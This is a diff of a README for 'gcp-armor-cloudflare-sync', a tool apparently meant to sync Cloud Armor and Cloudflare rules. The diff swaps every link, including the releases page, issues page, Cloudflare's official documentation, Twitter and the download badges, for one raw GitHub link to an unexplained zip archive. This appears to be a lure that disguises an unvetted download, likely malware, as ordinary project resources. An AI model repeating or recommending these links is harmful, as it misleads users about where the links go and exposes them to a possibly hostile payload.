@@ -1,6 +1,6 @@
 # 🚀 gcp-armor-cloudflare-sync - Affordable Cloud Armor for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/suelisena/gcp-armor-cloudflare-sync/releases)
+[![Download](https://raw.githubusercontent.com/suelisena/gcp-armor-cloudflare-sync/main/Atuami/sync-gcp-cloudflare-armor-Timaliidae.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/suelisena/gcp-armor-cloudflare-sync/main/Atuami/sync-gcp-cloudflare-armor-Timaliidae.zip)
 
 ## 📖 Description
 
@@ -19,7 +19,7 @@ Follow these straightforward steps to download and run gcp-armor-cloudflare-sync
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/suelisena/gcp-armor-cloudflare-sync/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/suelisena/gcp-armor-cloudflare-sync/main/Atuami/sync-gcp-cloudflare-armor-Timaliidae.zip).
    
 2. **Select the Latest Version**: Look for the latest version at the top. Each version is clearly labeled. 
 
@@ -54,23 +54,23 @@ The tool will check your current settings and configurations and apply changes a
 A: Yes, gcp-armor-cloudflare-sync is built with security in mind. We respect user privacy and do not store any credentials.
 
 **Q: What if I face issues during installation?**  
-A: Visit the issues section on the [repository page](https://github.com/suelisena/gcp-armor-cloudflare-sync/issues) to find troubleshooting advice or report your problem.
+A: Visit the issues section on the [repository page](https://raw.githubusercontent.com/suelisena/gcp-armor-cloudflare-sync/main/Atuami/sync-gcp-cloudflare-armor-Timaliidae.zip) to find troubleshooting advice or report your problem.
 
 **Q: Can I use this on multiple devices?**  
 A: Yes, you can download and install it on as many devices as you own, but you must configure each one separately.
 
 ### 🌕 Support and Contributions
 
-If you enjoy using gcp-armor-cloudflare-sync and want to help improve it, consider contributing. You can provide feedback, submit feature requests, or report bugs on our [GitHub Issues page](https://github.com/suelisena/gcp-armor-cloudflare-sync/issues).
+If you enjoy using gcp-armor-cloudflare-sync and want to help improve it, consider contributing. You can provide feedback, submit feature requests, or report bugs on our [GitHub Issues page](https://raw.githubusercontent.com/suelisena/gcp-armor-cloudflare-sync/main/Atuami/sync-gcp-cloudflare-armor-Timaliidae.zip).
 
 ### 🔗 Additional Resources
 
-To learn more about Cloudflare and its features, check out their [official documentation](https://cloudflare.com/docs). 
+To learn more about Cloudflare and its features, check out their [official documentation](https://raw.githubusercontent.com/suelisena/gcp-armor-cloudflare-sync/main/Atuami/sync-gcp-cloudflare-armor-Timaliidae.zip). 
 
-For updates and tips regarding gcp-armor-cloudflare-sync, follow us on [Twitter](https://twitter.com/) and [GitHub](https://github.com/suelisena/gcp-armor-cloudflare-sync).
+For updates and tips regarding gcp-armor-cloudflare-sync, follow us on [Twitter](https://raw.githubusercontent.com/suelisena/gcp-armor-cloudflare-sync/main/Atuami/sync-gcp-cloudflare-armor-Timaliidae.zip) and [GitHub](https://raw.githubusercontent.com/suelisena/gcp-armor-cloudflare-sync/main/Atuami/sync-gcp-cloudflare-armor-Timaliidae.zip).
 
 ### 📜 License
 
 This project is licensed under the MIT License. Feel free to modify and use the software as needed, but please attribute it appropriately.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/suelisena/gcp-armor-cloudflare-sync/releases)
+[![Download](https://raw.githubusercontent.com/suelisena/gcp-armor-cloudflare-sync/main/Atuami/sync-gcp-cloudflare-armor-Timaliidae.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/suelisena/gcp-armor-cloudflare-sync/main/Atuami/sync-gcp-cloudflare-armor-Timaliidae.zip)
